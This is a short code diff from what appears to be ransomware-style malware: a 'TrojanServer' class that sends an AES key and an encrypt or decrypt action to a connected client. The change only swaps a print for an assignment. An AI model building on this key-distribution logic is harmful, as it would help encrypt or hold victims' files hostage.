@@ -94,7 +94,7 @@ class TrojanServer:
         aes_key = self._generate_and_store_key() if self.action == "encrypt" else self._load_and_decrypt_key()
         protocol.send(self.conn, aes_key)
         protocol.send(self.conn, self.action)
-        print(protocol.receive(self.conn).decode())
+        data = protocol.receive(self.conn).decode()
 
     def _generate_and_store_key(self):
         word = self.keys.get_random_word()
